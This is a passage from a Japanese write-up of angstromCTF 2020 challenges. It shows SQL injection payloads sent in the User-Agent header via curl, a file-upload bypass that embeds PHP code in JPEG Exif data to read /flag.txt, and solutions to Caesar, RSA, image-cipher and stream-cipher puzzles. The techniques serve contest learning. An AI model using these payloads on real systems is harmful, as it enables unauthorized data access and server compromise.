+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# curl https://agents.2020.chall.actf.co/login? -A <span style="color:#e6db74">&#34;&#39; or 1=1--&#39;&#34;</span>
+&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;Super Secret Agents Login&lt;/title&gt;
+&lt;/head&gt;
+&lt;body style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;padding: 50px&#34;</span>&gt;
+	&lt;p&gt;hey! close, but no bananananananananana!!!! <span style="color:#f92672">(</span>there are many secret agents of course<span style="color:#f92672">)</span>&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>どうやら上手くいったようです。</p>
+<p>が、まだフラグは得られません。</p>
+<p><code>there are many secret agents of course</code>と書かれているように、複数のUAが設定されてしまうからでしょう。</p>
+<p>これを解決するために、<code>limit, offset</code>句を指定してあげましょう。</p>
+<p>例えば以下のような命令にすることで、</p>
+<p><code>' or 'A'='A' limit X offset Y;--'</code></p>
+<p>該当したUAのY番目からX個のものを設定することができます。</p>
+<p>色々試した結果、以下のリクエストを送ることでフラグが得られました！！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl https://agents.2020.chall.actf.co/login? -A <span style="color:#e6db74">&#34;&#39; or &#39;A&#39;=&#39;A&#39; limit 1 offset 2;--&#39;&#34;</span>
+&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;Super Secret Agents Login&lt;/title&gt;
+&lt;/head&gt;
+&lt;body style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;padding: 50px&#34;</span>&gt;
+	&lt;p&gt;Welcome, actf<span style="color:#f92672">{</span>nyoom_1_4m_sp33d<span style="color:#f92672">}</span>&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p><code>actf{nyoom_1_4m_sp33d}</code></p>
+<h2 id="defunds-crypt-web-120-pts-303-solves">Defund&rsquo;s Crypt (Web, 120 pts, 303 solves)</h2>
+<pre><code>One year since defund's descent. One crypt. One void to fill. Clam must do it, and so must you.
+</code></pre><p><a href="https://crypt.2020.chall.actf.co">問題ページ</a>のソースを見てみましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+    &lt;<span style="color:#f92672">head</span>&gt;
+        &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+        &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width,initial-scale=1&#34;</span>&gt;
+        &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/css?family=Inconsolata|Special+Elite&amp;display=swap&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
+        &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/style.css&#34;</span>&gt;
+        &lt;<span style="color:#f92672">title</span>&gt;Defund&#39;s Crypt&lt;/<span style="color:#f92672">title</span>&gt;
+    &lt;/<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">body</span>&gt;
+        <span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> Defund was a big fan of open source so head over to /src.php </span><span style="color:#75715e">--&gt;</span>
+        <span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> Also I have a flag in the filesystem at /flag.txt but too bad you can&#39;t read it </span><span style="color:#75715e">--&gt;</span>
+        &lt;<span style="color:#f92672">h1</span>&gt;Defund&#39;s Crypt&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;small&#34;</span>&gt;o&lt;/<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+                &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;crypt.jpg&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;300&#34;</span>/&gt;
+        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">autocomplete</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;off&#34;</span> <span style="color:#a6e22e">spellcheck</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
+            &lt;<span style="color:#f92672">p</span>&gt;Leave a memory:&lt;/<span style="color:#f92672">p</span>&gt;
+            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imgfile&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imgfile&#34;</span>&gt;
+            &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imgfile&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imglbl&#34;</span>&gt;Choose an image...&lt;/<span style="color:#f92672">label</span>&gt;
+            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Descend&#34;</span>&gt;
+        &lt;/<span style="color:#f92672">form</span>&gt;
+        &lt;<span style="color:#f92672">script</span>&gt;
+            <span style="color:#a6e22e">imgfile</span>.<span style="color:#a6e22e">oninput</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_</span> =&gt; {
+                <span style="color:#a6e22e">imgfile</span>.<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#34;satisfied&#34;</span>);
+                <span style="color:#a6e22e">imglbl</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">imgfile</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">name</span>;
+            };
+        &lt;/<span style="color:#f92672">script</span>&gt;
+    &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p><code>/flag.txt</code>にフラグがあるようです。が、直接アクセスすることはできません。</p>
+<p>どうやら<code>/src.php</code>にアクセスするとphpのソースが確認できるようです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;POST&#34;</span>) {
+    <span style="color:#75715e">// I just copy pasted this from the PHP site then modified it a bit
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// I&#39;m not gonna put myself through the hell of learning PHP to write one lousy angstrom chall
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">try</span> {
+        <span style="color:#66d9ef">if</span> (
+            <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;imgfile&#39;</span>][<span style="color:#e6db74">&#39;error&#39;</span>]) <span style="color:#f92672">||</span>
+            <span style="color:#a6e22e">is_array</span>($_FILES[<span style="color:#e6db74">&#39;imgfile&#39;</span>][<span style="color:#e6db74">&#39;error&#39;</span>])
+        ) {
+            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#39;The crypt rejects you.&#39;</span>);
+        }
+        <span style="color:#66d9ef">switch</span> ($_FILES[<span style="color:#e6db74">&#39;imgfile&#39;</span>][<span style="color:#e6db74">&#39;error&#39;</span>]) {
+            <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">UPLOAD_ERR_OK</span><span style="color:#f92672">:</span>
+                <span style="color:#66d9ef">break</span>;
+            <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">UPLOAD_ERR_NO_FILE</span><span style="color:#f92672">:</span>
+                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#39;You must leave behind a memory lest you be forgotten forever.&#39;</span>);
+            <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">UPLOAD_ERR_INI_SIZE</span><span style="color:#f92672">:</span>
+            <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">UPLOAD_ERR_FORM_SIZE</span><span style="color:#f92672">:</span>
+                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#39;People can only remember so much.&#39;</span>);
+            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#39;The crypt rejects you.&#39;</span>);
+        }
+        <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#39;imgfile&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000000</span>) {
+            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#39;People can only remember so much..&#39;</span>);
+        }
+        $finfo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">finfo</span>(<span style="color:#a6e22e">FILEINFO_MIME_TYPE</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">false</span> <span style="color:#f92672">===</span> $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_search</span>(
+            $finfo<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>($_FILES[<span style="color:#e6db74">&#39;imgfile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]),
+            <span style="color:#66d9ef">array</span>(
+                <span style="color:#e6db74">&#39;.jpg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;image/jpeg&#39;</span>,
+                <span style="color:#e6db74">&#39;.png&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;image/png&#39;</span>,
+                <span style="color:#e6db74">&#39;.bmp&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;image/bmp&#39;</span>,
+            ),
+            <span style="color:#66d9ef">true</span>
+        )) {
+            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#34;Your memory isn&#39;t picturesque enough to be remembered.&#34;</span>);
+        }
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($_FILES[<span style="color:#e6db74">&#34;imgfile&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>], $ext) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#34;The name of your memory doesn&#39;t seem to match its content.&#34;</span>);
+        }
+        $bname <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#34;imgfile&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
+        $fname <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;%s%s&#34;</span>, <span style="color:#a6e22e">sha1_file</span>($_FILES[<span style="color:#e6db74">&#34;imgfile&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>]), <span style="color:#a6e22e">substr</span>($bname, <span style="color:#a6e22e">strpos</span>($bname, <span style="color:#e6db74">&#34;.&#34;</span>)));
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">move_uploaded_file</span>(
+            $_FILES[<span style="color:#e6db74">&#39;imgfile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>],
+            <span style="color:#e6db74">&#34;./memories/&#34;</span> <span style="color:#f92672">.</span> $fname
+        )) {
+            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span>(<span style="color:#e6db74">&#39;Your memory failed to be remembered.&#39;</span>);
+        }
+        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">301</span>);
+        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /memories/&#34;</span> <span style="color:#f92672">.</span> $fname);
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">RuntimeException</span> $e) {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt;&#34;</span> <span style="color:#f92672">.</span> $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/p&gt;&#34;</span>;
+    }
+}
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>いくつかのチェックを潜り抜ければファイルをアップロードできるようです。</p>
+<p>以下の部分でファイルが画像かどうかをチェックしています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (false === $ext = array_search(
+    $finfo-&gt;file($_FILES[&#39;imgfile&#39;][&#39;tmp_name&#39;]),
+    array(
+        &#39;.jpg&#39; =&gt; &#39;image/jpeg&#39;,
+        &#39;.png&#39; =&gt; &#39;image/png&#39;,
+        &#39;.bmp&#39; =&gt; &#39;image/bmp&#39;,
+    ),
+    true
+)) {
+    throw new RuntimeException(&#34;Your memory isn&#39;t picturesque enough to be remembered.&#34;);
+</code></pre></div><p>例えばファイルに<code>.jpg</code>が含まれていればファイルのMIMEタイプを<code>image/jpeg</code>に設定します。</p>
+<p>ここを上手くやり過ごして、例えば<code>php</code>ファイルなどをアップロードして実行させることはできないでしょうか？</p>
+<p>色々調べた結果、<a href="https://medium.com/@igordata/php-running-jpg-as-php-or-how-to-prevent-execution-of-user-uploaded-files-6ff021897389">このサイト</a>に辿り着きました。</p>
+<p>何と<code>jpg</code>ファイルの<code>Exif</code>に書かれたPHPコードが実行される場合があるようです。</p>
+<p>試してみましょう。</p>
+<p>以下のような<code>jpg</code>ファイルを作成し、拡張子を<code>.jpg.php</code>のようにしてからアップロードを試みます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067216-f54db200-6a27-11ea-8622-21a63eb24f48.PNG" alt="キャプチャimgup"></p>
+<p>画像は別に何でも構いません。</p>
+<p>以下のコードを仕込むことによって、<code>/flag.txt</code>を読み込んで表示させます。</p>
+<p><code>&lt;?php $flag = file_get_contents('/flag.txt'); echo $flag; ?&gt;</code></p>
+<p>画像に仕込んだコードが実行され、フラグが表示されました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067711-c7b53880-6a28-11ea-8500-7cf5cfbddceb.png" alt="FireShot Capture 027 -  - crypt 2020 chall actf co"></p>
+<p><code>actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}</code></p>
+<h1 id="crypto">CRYPTO</h1>
+<h2 id="keysar-crypto-40-pts-867-solves">Keysar (Crypto, 40 pts, 867 solves)</h2>
+<pre><code>Hey! My friend sent me a message... He said encrypted it with the key ANGSTROMCTF.
+
+He mumbled what cipher he used, but I think I have a clue.
+
+Gotta go though, I have history homework!!
+
+agqr{yue_stdcgciup_padas}
+</code></pre><p>暗号化されたフラグからシーザー暗号だと推測できます。</p>
+<p>鍵は<code>ANGSTROMCTF</code>ということなので、<a href="https://www.boxentriq.com/code-breaking/keyed-caesar-cipher">このサイト</a>で復号しました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067747-d7348180-6a28-11ea-9666-b01ee87156fa.png" alt="FireShot Capture 028 - Keyed Caesar Cipher (online tool) - Boxentriq - www boxentriq com"></p>
+<p><code>actf{yum_delicious_salad}</code></p>
+<h2 id="reasonably-strong-algorithm-crypto-70-pts-742-solves">Reasonably Strong Algorithm (Crypto, 70 pts, 742 solves)</h2>
+<pre><code>RSA strikes again!
+</code></pre><p>RSA暗号の問題です。</p>
+<p>以下のパラメータが与えられます。</p>
+<pre><code>n = 126390312099294739294606157407778835887
+e = 65537
+c = 13612260682947644362892911986815626931
+</code></pre><p><code>n</code>がやけに小さいです。</p>
+<p>RSA暗号は<code>n</code>の素因数分解ができると解けてしまいます。</p>
+<p><code>n</code>を素因数分解してみましょう。</p>
+<p><a href="http://factordb.com/index.php?query=126390312099294739294606157407778835887">このサイト</a>に<code>n</code>を投げると<code>n = p * q</code>となる<code>p</code>, <code>q</code>を得ることができました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067796-e5829d80-6a28-11ea-9c0c-b6d717798c7d.png" alt="FireShot Capture 029 - factordb com - factordb com"></p>
+<p>得られた値を使って復号しましょう！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util <span style="color:#f92672">import</span> number
+<span style="color:#f92672">import</span> math
+
+n <span style="color:#f92672">=</span> <span style="color:#ae81ff">126390312099294739294606157407778835887</span>
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">13612260682947644362892911986815626931</span>
+
+p <span style="color:#f92672">=</span> <span style="color:#ae81ff">9336949138571181619</span>
+q <span style="color:#f92672">=</span> <span style="color:#ae81ff">13536574980062068373</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extgcd</span>(a, b):
+    r <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, a]
+    w <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, b]
+
+    <span style="color:#66d9ef">while</span> w[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
+        q <span style="color:#f92672">=</span> r[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">/</span><span style="color:#f92672">/</span> w[<span style="color:#ae81ff">2</span>]
+        r2 <span style="color:#f92672">=</span> w
+        w2 <span style="color:#f92672">=</span> [ r[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> w[<span style="color:#ae81ff">0</span>], r[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> w[<span style="color:#ae81ff">1</span>], r[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> w[<span style="color:#ae81ff">2</span>] ]
+        r <span style="color:#f92672">=</span> r2
+        w <span style="color:#f92672">=</span> w2
+    <span style="color:#66d9ef">return</span> [ w[<span style="color:#ae81ff">0</span>], w[<span style="color:#ae81ff">1</span>] ]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mod_inv</span>(a, m):
+    x <span style="color:#f92672">=</span> extgcd(a, m)[<span style="color:#ae81ff">0</span>]  
+    <span style="color:#66d9ef">return</span> (m <span style="color:#f92672">+</span> x <span style="color:#f92672">%</span> m ) <span style="color:#f92672">%</span> m
+
+l <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span><span style="color:#f92672">/</span> math<span style="color:#f92672">.</span>gcd( (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) )        <span style="color:#75715e"># p-1とq-1の最小公倍数lを求める</span>
+d <span style="color:#f92672">=</span> mod_inv(e, l)                   <span style="color:#75715e"># e * d = 1 mod lより，秘密鍵dを求める</span>
+m <span style="color:#f92672">=</span> pow(c, d, n)                    <span style="color:#75715e"># c ^ d mod nより，平文mを求める</span>
+<span style="color:#66d9ef">print</span>(number<span style="color:#f92672">.</span>long_to_bytes(m))
+</code></pre></div><p>実行すると、フラグを得られました！！</p>
+<p><code>actf{10minutes}</code></p>
+<h2 id="wacko-images-crypto-90-pts-494-solves">Wacko Images (Crypto, 90 pts, 494 solves)</h2>
+<pre><code>How to make hiding stuff a e s t h e t i c? And can you make it normal again? enc.png image-encryption.py
+
+The flag is actf{x#xx#xx_xx#xxx} where x represents any lowercase letter and # represents any one digit number.
+</code></pre><p>暗号化された画像と暗号化プログラムのソースが与えられます。</p>
+<p>ソースを見てみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> numpy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+
+flag <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag.png</span><span style="color:#e6db74">&#34;</span>)
+img <span style="color:#f92672">=</span> array(flag)
+
+key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">23</span>]
+
+a, b, c <span style="color:#f92672">=</span> img<span style="color:#f92672">.</span>shape
+
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, a):
+    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, b):
+        pixel <span style="color:#f92672">=</span> img[x, y]
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3</span>):
+            pixel[i] <span style="color:#f92672">=</span> pixel[i] <span style="color:#f92672">*</span> key[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">251</span>
+        img[x][y] <span style="color:#f92672">=</span> pixel
+
+enc <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(img)
+enc<span style="color:#f92672">.</span>save(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">enc.png</span><span style="color:#e6db74">&#39;</span>)
+</code></pre></div><p>元画像のRGB値に<code>[41, 37, 23]</code>という値を掛け、251で法を取っています。</p>
+<p>RGB値は0~255までなので総当たりしてみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> numpy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+
+enc <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">enc.png</span><span style="color:#e6db74">&#34;</span>)
+img <span style="color:#f92672">=</span> array(enc)
+
+key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">23</span>]
+
+a, b, c <span style="color:#f92672">=</span> img<span style="color:#f92672">.</span>shape
+
+<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, a):
+    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, b):
+        pixel <span style="color:#f92672">=</span> img[x, y]
+        buf <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3</span>):
+            <span style="color:#66d9ef">for</span> pix <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">256</span>):
+                <span style="color:#66d9ef">if</span> pixel[i] <span style="color:#f92672">==</span> pix <span style="color:#f92672">*</span> key[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">251</span>:
+                    buf<span style="color:#f92672">.</span>append(pix)
+                    <span style="color:#66d9ef">break</span>
+        buf<span style="color:#f92672">.</span>append(pixel[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+        img[x][y] <span style="color:#f92672">=</span> buf
+
+flag <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(img)
+flag<span style="color:#f92672">.</span>save(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">flag.png</span><span style="color:#e6db74">&#39;</span>)
+</code></pre></div><p>少し時間がかかりますが、画像が復元できます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067842-f4695000-6a28-11ea-8e48-e1be4468a1ca.png" alt="flag"></p>
+<h2 id="confused-streaming-crypto-100-pts-297-solves">Confused Streaming (Crypto, 100 pts, 297 solves)</h2>
+<pre><code>Crypto
+I made a stream cipher!
+
+nc crypto.2020.chall.actf.co 20601
+</code></pre><p><code>nc</code>コマンドを実行してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\kuzushiki\Desktop&gt; nc crypto.2020.chall.actf.co 20601                     
+a: 1
+b: 4
+c: 1
+01100001011000110111010001100110011110110110010001101111011101110110111001011111011101000110111101011111011101000110100001100101010111110110010001100101011000110110100101101101011000010110110001111101
+</code></pre></div><p><code>a,b,c</code>を送ると、それに対応した暗号文が返ってくるようです。</p>
+<p>暗号化プログラムのソースが与えられているので、見てみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> __future__ <span style="color:#f92672">import</span> print_function
+<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span>os<span style="color:#f92672">,</span>sys<span style="color:#f92672">,</span>binascii
+<span style="color:#f92672">from</span> decimal <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#66d9ef">try</span>:
+	input <span style="color:#f92672">=</span> raw_input
+<span style="color:#66d9ef">except</span>:
+	<span style="color:#66d9ef">pass</span>
+getcontext()<span style="color:#f92672">.</span>prec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keystream</span>(key):
+	random<span style="color:#f92672">.</span>seed(int(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">seed</span><span style="color:#e6db74">&#34;</span>]))
+	e <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">1000</span>)
+	<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+		d <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">100</span>)
+		ret <span style="color:#f92672">=</span> Decimal(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0.</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>str(key <span style="color:#f92672">*</span><span style="color:#f92672">*</span> e)<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">.</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(d):
+			ret<span style="color:#f92672">*</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
